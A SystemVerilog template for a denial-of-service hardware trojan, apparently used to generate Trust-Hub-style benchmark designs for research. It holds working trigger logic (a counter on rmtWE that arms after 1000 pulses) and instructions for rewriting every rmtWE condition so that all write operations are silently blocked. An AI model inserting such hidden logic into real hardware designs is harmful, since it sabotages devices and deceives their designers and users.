/**
 * Sequential DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables operations by blocking rmtWE control signal
 *   
 * Trigger: Counter on rmtWE
 * Payload: Block rmtWE when trojan activates
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rstWritePhyRegNum) begin
    if (!rstWritePhyRegNum) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count trigger signal activations
        if (rmtWE) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        // Activate when threshold reached
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block rmtWE when trojan is active
//
// IMPORTANT: rmtWE is an INPUT signal - we CANNOT assign to it!
// Instead, we modify WHERE IT'S USED in conditional statements.
//
// Integration Script Must:
//   Find all occurrences of:
//     if (rmtWE) begin
//   
//   Replace with:
//     if (rmtWE && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: rmtWE && 0 = 0 (always false)
//   All operations controlled by rmtWE are blocked
//   Result: Denial of Service!